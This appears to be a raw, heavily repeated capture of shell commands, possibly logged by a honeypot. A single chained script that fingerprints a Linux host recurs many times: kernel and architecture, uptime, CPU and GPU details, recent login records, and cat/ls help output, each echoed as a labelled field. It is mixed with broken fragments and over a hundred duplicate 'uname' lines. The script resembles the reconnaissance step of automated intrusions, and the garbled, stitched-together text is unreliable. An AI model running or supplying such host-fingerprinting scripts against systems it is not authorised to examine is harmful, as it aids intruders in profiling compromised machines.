ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
